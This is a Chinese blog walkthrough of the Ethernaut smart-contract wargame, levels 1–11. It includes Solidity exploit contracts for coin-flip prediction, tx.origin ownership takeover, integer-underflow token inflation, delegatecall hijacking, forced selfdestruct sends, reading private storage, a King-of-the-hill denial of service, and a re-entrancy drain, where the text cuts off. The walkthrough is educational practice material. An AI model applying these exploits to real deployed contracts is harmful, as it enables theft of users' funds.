@@ -1,0 +1,949 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#dae9f4">
+  <meta name="author" content="Victifa">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="The Ethernaut01. Hello Ethetnaut 在控制台输入 await contract.info()，获得提示：&#x3D;&#x3D;You will find what you need in info1().&#x3D;&#x3D;  输入 await contract.info1()，得到&#x3D;&#x3D;Try info2(), but with “hello” as a parameter.&#x3D;&#x3D;，即以 “hello”">
+<meta property="og:type" content="article">
+<meta property="og:title" content="The Ethernaut">
+<meta property="og:url" content="http://example.com/2025/03/22/The%20Ethernaut/index.html">
+<meta property="og:site_name" content="Victifa">
+<meta property="og:description" content="The Ethernaut01. Hello Ethetnaut 在控制台输入 await contract.info()，获得提示：&#x3D;&#x3D;You will find what you need in info1().&#x3D;&#x3D;  输入 await contract.info1()，得到&#x3D;&#x3D;Try info2(), but with “hello” as a parameter.&#x3D;&#x3D;，即以 “hello”">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/03/22/pics/00/00.01.png">
+<meta property="og:image" content="http://example.com/2025/03/22/pics/00/00.02.png">
+<meta property="og:image" content="http://example.com/2025/03/22/pics/03/03.01.png">
+<meta property="og:image" content="http://example.com/2025/03/22/The%20Ethernaut/pics/09/09.01.png">
+<meta property="article:published_time" content="2025-03-21T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-03-22T15:23:24.283Z">
+<meta property="article:author" content="Victifa">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2025/03/22/pics/00/00.01.png">
+  
+  
+  
+  <title>The Ethernaut - Victifa</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":3},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>myBlog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="The Ethernaut"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-22 00:00" pubdate>
+          2025年3月22日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          43 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">The Ethernaut</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="The-Ethernaut"><a href="#The-Ethernaut" class="headerlink" title="The Ethernaut"></a>The Ethernaut</h1><h2 id="01-Hello-Ethetnaut"><a href="#01-Hello-Ethetnaut" class="headerlink" title="01. Hello Ethetnaut"></a>01. Hello Ethetnaut</h2><ol>
+<li><p>在控制台输入 <code>await contract.info()</code>，获得提示：==You will find what you need in info1().==</p>
+</li>
+<li><p>输入 <code>await contract.info1()</code>，得到==Try info2(), but with “hello” as a parameter.==，即以 “hello” 作为<code>info2()</code>函数的参数</p>
+</li>
+<li><p>输入 <code>await contract.info2(&quot;hello&quot;)</code>，得到==The property infoNum holds the number of the next info method to call ”==</p>
+</li>
+<li><p>输入 <code>await contract.infoNum()</code>，查看详细数据，结果如下，说明下一个查看的是 <code>info42()</code>(宇宙的终极答案)<img src="..\pics\00\00.01.png" srcset="/img/loading.gif" lazyload alt=""></p>
+</li>
+<li><p>输入 <code>await contract.info42()</code>，得到==theMethodName is the name of the next method.==，即下一个函数的名字为 <code>theMethodName（）</code></p>
+</li>
+<li><p>输入 <code>await contract.theMethodName()</code>，得到==The method name is method7123949.==</p>
+</li>
+<li><p>输入 <code>await contract.method7123949()</code>，得到==If you know the password, submit it to authenticate().==，显然我们不知道密码</p>
+</li>
+<li><p>输入 <code>await contract.password()</code>，得到密码==ethernaut0==，把它作为 <code>authenticate()</code> 函数的参数</p>
+</li>
+<li><p>输入 <code>await contract.authenticate(&quot;ethernaut0&quot;)</code>，提交实例，过关</p>
+</li>
+<li><p>✌(◕‿-)✌ 牛逼！, 你通过了这关!!!</p>
+</li>
+</ol>
+<ul>
+<li>摊牌了，在最开始输入 <code>await contract</code> 时就获得了该关的所有函数，实际可以跳着走</li>
+</ul>
+<p><img src="..\pics\00\00.02.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h2 id="02-Fallback"><a href="#02-Fallback" class="headerlink" title="02. Fallback"></a>02. Fallback</h2><p>过关条件：</p>
+<ol>
+<li>获得这个合约的所有权</li>
+<li>把他的余额减到0</li>
+</ol>
+<h3 id="条件1：获得这个合约的所有权"><a href="#条件1：获得这个合约的所有权" class="headerlink" title="条件1：获得这个合约的所有权"></a>条件1：获得这个合约的所有权</h3><p>很明显，<code>owner</code> 的改变仅在 <code>contribute()</code> 和 <code>receive()</code> 中出现。</p>
+<p>由于 <code>constructor</code> 中将 <code>contributions[owner]</code> 设为 1000 ether，我们无法支付，排除。</p>
+<p>看向 <code>receive()</code>，条件为 <code>mas.value &gt; 0</code>（简单），<code>contributions[msg.sender] &gt; 0</code></p>
+<ul>
+<li>结论： <code>contribute()</code> 支付 1wei，使 <code>contributions[msg.sender] &gt; 0</code> —-&gt; <code>receive()</code> 改变 owner</li>
+</ul>
+<h3 id="条件2：把他的余额减到0"><a href="#条件2：把他的余额减到0" class="headerlink" title="条件2：把他的余额减到0"></a>条件2：把他的余额减到0</h3><p>直接用 <code>withdraw()</code> 函数就行了。</p>
+<h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><ul>
+<li><p><code>receive()</code> 的调用方法：确认发送的以太币数量（比如1wei），使用低级交互，不输入地址，直接 Transact</p>
+</li>
+<li><p>小狐狸交互好慢啊 &gt;_&lt;</p>
+</li>
+</ul>
+<h2 id="03-Fallout"><a href="#03-Fallout" class="headerlink" title="03. Fallout"></a>03. Fallout</h2><h3 id="条件：获得这个合约的所有权"><a href="#条件：获得这个合约的所有权" class="headerlink" title="条件：获得这个合约的所有权"></a>条件：获得这个合约的所有权</h3><p>观察发现，该合约仅在构造函数中可以更改 owner。</p>
+<p>再观察发现，如头图所示，该构造函数并非构造函数，而是一个名为 <code>Fal1out()</code> 的普通函数。</p>
+<ul>
+<li>结论：使用钱包的地址调用该合约即可</li>
+</ul>
+<h3 id="实操-1"><a href="#实操-1" class="headerlink" title="实操"></a>实操</h3><ul>
+<li><p>由于源代码无法完成编译，使用如下接口变相调用该合约</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">interface Fallout &#123;<br>    function Fal1out() external payable;<br>    function owner() external view returns(address owner);<br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="04-Coin-Flip"><a href="#04-Coin-Flip" class="headerlink" title="04. Coin Flip"></a>04. Coin Flip</h2><h3 id="条件：连续猜对十次结果"><a href="#条件：连续猜对十次结果" class="headerlink" title="条件：连续猜对十次结果"></a>条件：连续猜对十次结果</h3><p>要求我们输入的 <code>_guess</code> 与 <code>side</code> 相等。</p>
+<p>观察 <code>side = coinFlip == 1 ? true : false</code>，说明要判断 <code>CoinfFlip</code> 是否为 1</p>
+<p>而 <code>coinFlip = blockValue / FACTOR</code> —-&gt; <code>blockValue</code> 是否等于 <code>FACTOR</code></p>
+<p><code>blockValue = uint256( blockhash(block.number - 1) )</code>，<code>blockValue</code> 为上一个区块的哈希转为整型后的结果</p>
+<ul>
+<li>结论：计算出这个结果（当然是让电脑来）—-&gt; 以结果为参数，调用 <code>flip</code> 函数</li>
+</ul>
+<h3 id="实操-2"><a href="#实操-2" class="headerlink" title="实操"></a>实操</h3><p>通过如下代码，一键计算并调用函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">interface CoinFlip &#123;<br>    function flip(bool _guess) external returns (bool);<br>&#125;<br><br>contract Coin &#123;<br>    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br>    address addr;<br>    constructor (address _addr) &#123;<br>        addr = _addr;<br>    &#125;<br>    function getNum() public &#123;<br>        uint256 blockValue = uint256(blockhash(block.number - 1));<br>        uint256 coinFlip = blockValue / FACTOR;<br>        bool side = coinFlip == 1 ? true : false;<br>        CoinFlip(addr).flip(side);<br>    &#125; <br>&#125;<br></code></pre></td></tr></table></figure>
+<p>调用两次后，调用 <code>getter</code> 函数 <code>await contract.consecutiveWins()</code>，结果如下：</p>
+<p><img src="..\pics\03\03.01.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>正确，慢慢执行十次就行了。</p>
+<ul>
+<li>注：两次执行间要有一定间隔，否则会报错 <code>Gas estimation failed</code>。</li>
+</ul>
+<h2 id="05-Telephone"><a href="#05-Telephone" class="headerlink" title="05. Telephone"></a>05. Telephone</h2><h3 id="条件：获得下面合约的所有权"><a href="#条件：获得下面合约的所有权" class="headerlink" title="条件：获得下面合约的所有权"></a>条件：获得下面合约的所有权</h3><p>显然，想改变 owner 只能通过 <code>changeOwner</code> 函数，且满足 <code>tx.origin != msg.sender</code>，msg.sender 就是我们的钱包地址。</p>
+<p>查阅<a target="_blank" rel="noopener" href="https://learnblockchain.cn/docs/solidity/units-and-global-variables.html#special-variables-and-functions">官网</a>，<code>tx.origin</code> (<code>address</code>)：交易的发送者（完整调用链）。</p>
+<ul>
+<li>结论：直接用我们的钱包地址调用 <code>changeOwner</code> 函数即可。</li>
+</ul>
+<h3 id="实操-3"><a href="#实操-3" class="headerlink" title="实操"></a>实操</h3><p>部署并调用 <code>change</code> 函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">interface Tele &#123;<br>    function changeOwner(address _owner) external;<br>&#125;<br><br>contract get &#123;<br>    address addr = 0x1E5592cc2baFC29eef55feaeFE4f0e7302bd0a24;	// 根据生成的合约地址更改<br>    function change() public &#123;<br>        Tele(addr).changeOwner(msg.sender);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h2 id="06-Token"><a href="#06-Token" class="headerlink" title="06. Token"></a>06. Token</h2><h3 id="前置知识：数据的溢出（overflow）"><a href="#前置知识：数据的溢出（overflow）" class="headerlink" title="前置知识：数据的溢出（overflow）"></a>前置知识：数据的溢出（overflow）</h3><blockquote>
+<p>Solidity 中的整数限制在某个范围内。例如，对于 <code>uint32</code>，范围是 <code>0</code> 到 <code>2**32 - 1</code>。</p>
+</blockquote>
+<ul>
+<li>上溢：对于 <code>uint32</code> 类型的变量，达到最大值之后再 +1，变量会变为最小值 0</li>
+<li>下溢：对于 <code>uint32</code> 类型的变量，达到最小值之后再 -1，变量会变为最大值 2**32 - 1</li>
+</ul>
+<blockquote>
+<p> Solidity v0.8.0 重大变更…    语义的静默变化…    -&gt;算术运算在下溢和上溢时会回退。你可以使用 <code>unchecked &#123; ... &#125;</code> 来使用之前的环绕行为。</p>
+</blockquote>
+<p>由于 <code>Solidity</code> 在 v0.8.0增加了自动回退，可以用以下代码测试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract test &#123;<br>    function overflow() public pure returns(uint32)&#123;<br>        uint32 x = 2**32 - 1; <br>        unchecked &#123;return (x + 1);&#125;<br>    &#125;<br>    function underflow() public pure returns(bool)&#123;<br>        uint32 x = 0; <br>        unchecked &#123;return (x - 1 == 2**32 - 1);&#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>结果分别为 0 和 true</p>
+<h3 id="条件：增加你手中的-token-数量"><a href="#条件：增加你手中的-token-数量" class="headerlink" title="条件：增加你手中的 token 数量"></a>条件：增加你手中的 token 数量</h3><p>显然要通过 <code>transfer</code> 函数。</p>
+<p>由于 v0.6.0 没有自动回退，我们可以通过让 <code>balances[msg.sender] - _value</code> 发生下溢来绕开 require。</p>
+<ul>
+<li>结论：通过 <code>contract</code> 调用 <code>transfer(wallet, 任意正数)</code>（由于 msg.sender 为合约地址，减去任意数后下溢，变为很大的数）</li>
+</ul>
+<h3 id="实操-4"><a href="#实操-4" class="headerlink" title="实操"></a>实操</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs solidity">interface Token &#123;<br>     function transfer(address _to, uint256 _value) external returns (bool);<br>     function balanceOf(address _owner) external view returns (uint256 balance);<br>&#125;<br><br>contract moreTokens &#123;<br>    address addr;<br>    address wallet;<br>    constructor(address _contract) &#123;<br>        addr = _contract;<br>    &#125;<br>    function addToken() public &#123;<br>        Token(addr).transfer(msg.sender, 1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<ul>
+<li><p>实际操作后，<code>balances[合约地址] = 115792089237316195423570985008687907853269984665640564039457584007913129639935</code>，</p>
+<p><code>balances[钱包地址] = 21</code>。你过关！</p>
+</li>
+</ul>
+<h2 id="07-Delegation"><a href="#07-Delegation" class="headerlink" title="07. Delegation"></a>07. Delegation</h2><h3 id="条件：获得这个合约的所有权-1"><a href="#条件：获得这个合约的所有权-1" class="headerlink" title="条件：获得这个合约的所有权"></a>条件：获得这个合约的所有权</h3><p>显然，要通过 <code>fallback()</code> 函数来 <code>delegatecall</code> <code>Delegate</code> 合约中的 <code>pwn()</code> 函数。</p>
+<p>这时，<code>msg.sender</code> 仍是我们，<code>msg.data</code> 是 <code>pwn()</code> 的，而上下文是 <code>Delegation</code> 合约的，从而通过 <code>Delegate</code> 的 <code>pwn()</code> 修改 <code>Delegation</code> 中的 <code>owner</code>。</p>
+<h3 id="实操-5"><a href="#实操-5" class="headerlink" title="实操"></a>实操</h3><ol>
+<li>以 <code>Delegation</code> 的地址部署 <code>Delegate</code> 合约</li>
+<li>调用 <code>pwn()</code>，向该地址传入 <code>pwn()</code> 的 <code>abi</code>，由于 <code>Delegation</code> 不存在该函数，转入 <code>fallback</code>，将其作为 <code>msg.data</code> 来 <code>delegatecall</code> <code>Delegate</code> 合约。</li>
+</ol>
+<h2 id="08-Force"><a href="#08-Force" class="headerlink" title="08. Force"></a>08. Force</h2><h3 id="条件：是使合约的余额大于0"><a href="#条件：是使合约的余额大于0" class="headerlink" title="条件：是使合约的余额大于0"></a>条件：是使合约的余额大于0</h3><p>嗯，自毁</p>
+<ul>
+<li>结论： 给自己的合约1wei -&gt; <code>selfdestruct(to)</code></li>
+</ul>
+<h3 id="实操-6"><a href="#实操-6" class="headerlink" title="实操"></a>实操</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract force &#123;<br>    address to;<br>    constructor (address _to)payable &#123;<br>        to = _to;<br>    &#125;<br>    function send() public &#123;<br>        selfdestruct(payable(to));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h2 id="09-Vault"><a href="#09-Vault" class="headerlink" title="09. Vault"></a>09. Vault</h2><h3 id="前置知识：插槽-slot"><a href="#前置知识：插槽-slot" class="headerlink" title="前置知识：插槽 slot"></a>前置知识：插槽 slot</h3><blockquote>
+<p>合约的状态变量以紧凑的方式存储在存储中，以至于多个值有时使用相同的存储槽。 除了动态大小的数组和 映射mapping 外，<strong>数据是连续存储的，逐项存储，从第一个状态变量开始，该变量存储在槽 <code>0</code> 中</strong>。 对于每个变量，根据其类型确定以字节为单位的大小。 多个连续的项如果少于 32 字节，则尽可能打包到一个存储槽中，遵循以下规则：</p>
+<ul>
+<li>存储槽中的第一项是低位对齐存储的。</li>
+<li>值类型仅使用存储它们所需的字节数。</li>
+<li>如果存储槽中的剩余空间不足以储存一个值类型，那么它会存储在下一个存储槽中。</li>
+<li>结构体和数组数据总是会开启一个新槽，并且它们的数据根据这些规则紧密打包。</li>
+<li>紧随结构体或数组数据的数据总是开始一个新的存储槽。</li>
+</ul>
+<p>对于使用继承的合约，状态变量的顺序由从最基础合约开始的 C3 线性化顺序决定。 如果上述规则允许，来自不同合约的状态变量可以共享同一个存储槽。</p>
+<p>结构体和数组的元素是依次存储的，就像它们单独声明时一样。</p>
+</blockquote>
+<p>简单来说，状态变量为 storage 类型，storage 共有 2^256^ 个插槽，一个插槽存 32 字节。</p>
+<p>第一个状态变量从槽 0 的右端开始存，依次往后。</p>
+<p>如果上一个变量没把槽占满，下一个变量又刚好塞得进去，那两个变量就塞一个槽里，直到剩余空间塞不下下一个变量。</p>
+<p>若变量 a 在槽1，变量 b 塞不进槽1，那么变量 b 就存在槽2（槽1的顺位）；此时变量 c 能塞进槽1，就和变量 a 一起存在槽1中，尽管变量的声明顺序为a, b, c。</p>
+<p>可以借助以下图示理解（<a target="_blank" rel="noopener" href="https://s.foresightnews.pro/article/detail/1511">来自这里</a>）</p>
+<p><img src="./pics/09/09.01.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<ul>
+<li>详见<a target="_blank" rel="noopener" href="https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html">官方文档</a>，或<a target="_blank" rel="noopener" href="https://s.foresightnews.pro/article/detail/1511">智能合约安全审计入门篇 —— 访问私有数据</a></li>
+</ul>
+<h3 id="条件：打开金库"><a href="#条件：打开金库" class="headerlink" title="条件：打开金库"></a>条件：打开金库</h3><blockquote>
+<p>来自官方的警告：</p>
+<p>将某些内容设置为 <code>private</code> 或 <code>internal</code> 仅仅是防止其他合约读取或修改这些信息，但它仍然对区块链外的整个世界可见。</p>
+<p>以及：</p>
+<p>私有信息和随机性</p>
+<p>你在智能合约中使用的所有内容都是公开可见的，即使是标记为 <code>private</code> 的局部变量和状态变量。</p>
+<p>在智能合约中使用随机数是相当棘手的，如果你不希望区块构建者能够作弊。</p>
+</blockquote>
+<p>因此，我们可以通过访问插槽直接获得 password。</p>
+<p>方法为：<code>web3.eth.getStorageAt(合约地址,插槽索引)</code>。</p>
+<ul>
+<li>结论：获得 password -&gt; 调用 unlock 函数</li>
+</ul>
+<h3 id="实操-7"><a href="#实操-7" class="headerlink" title="实操"></a>实操</h3><ol>
+<li>显然 password 的索引为1，输入 <code>await web3.eth.getStorageAt(&quot;0x53b47D4494909d6E6773875FD195938C6826A34A&quot;,1)</code><ul>
+<li>记得地址要加引号</li>
+</ul>
+</li>
+<li>调用函数：<code>await contract.unlock(&quot;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&quot;)</code></li>
+<li>你过关</li>
+</ol>
+<h2 id="10-King"><a href="#10-King" class="headerlink" title="10. King"></a>10. King</h2><h3 id="条件：提交实例时，阻止关卡获得王位"><a href="#条件：提交实例时，阻止关卡获得王位" class="headerlink" title="条件：提交实例时，阻止关卡获得王位"></a>条件：提交实例时，阻止关卡获得王位</h3><p>即：我们要阻止 <code>king = msg.sender</code>的执行，有两个方法：</p>
+<ul>
+<li><p>其一，通过 require 的 <code>msg.value &gt;= prize</code>，显然不可能，它肯定会直接使用一个超大的值。</p>
+</li>
+<li><p>其二，让 transfer 失败，自动回滚。显然，只能通过这个方法。</p>
+</li>
+</ul>
+<p>而让 tranfer 失败也有两个方法：</p>
+<ul>
+<li>其一，gas 超过 2300</li>
+<li>其二，transfer to 的对象没有 fallback 或 receive，无法接受 ETH</li>
+</ul>
+<p>显然选择法二</p>
+<ul>
+<li>结论：先让我们的 contract 成为 King -&gt; 由于 contract 无法接受 ETH，transfer 失败，变量 king 无法被改变</li>
+</ul>
+<h3 id="实操-8"><a href="#实操-8" class="headerlink" title="实操"></a>实操</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract win &#123;<br>    address addr;<br>    constructor(address _addr) payable &#123;<br>        addr = _addr;<br>    &#125;<br>    <br>    function beKing(uint256 _prize) public payable&#123;<br>        (bool success,) = addr.call&#123;value: _prize&#125;(&quot;&quot;);<br>        if (!success) &#123;<br>            revert(&quot;It failed&quot;);<br>        &#125;<br>    &#125;<br><br>    function getBack(address payable me, uint256 left) public &#123;<br>        me.transfer(left);<br>    &#125;<br><br>    function getBalance() public view returns(uint256)&#123;<br>        return (address(this).balance);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>部署时传入与 prize 相等的 ETH</p>
+<h2 id="11-Re-entrancy"><a href="#11-Re-entrancy" class="headerlink" title="11. Re-entrancy"></a>11. Re-entrancy</h2><h3 id="条件：盗取所有的-ETH"><a href="#条件：盗取所有的-ETH" class="headerlink" title="条件：盗取所有的 ETH"></a>条件：盗取所有的 ETH</h3><p>字如其名，重入攻击，具体可参考：<a target="_blank" rel="noopener" href="https://learnblockchain.cn/docs/solidity/security-considerations.html">安全考量</a>中的重入板块。</p>
+<p>其特点是：先提取资金，在更新数据。</p>
+<p>由于提取资金时，对象可能是合约而非普通的钱包地址，可以利用 receive 在接收 ETH 的同时，赶在更新数据前再次提取资金。</p>
+<ul>
+<li>结论：在 receive 函数中，再次调用 withdraw 函数</li>
+</ul>
+<h3 id="实操-9"><a href="#实操-9" class="headerlink" title="实操"></a>实操</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">interface IRe &#123;<br>    function donate(address _to) external payable;<br>    function balanceOf(address _who) external view returns (uint256 balance);<br>    function withdraw(uint256 _amount) external;<br>&#125;<br><br>contract a &#123;<br>    IRe ire;<br>    constructor(address _addr) payable 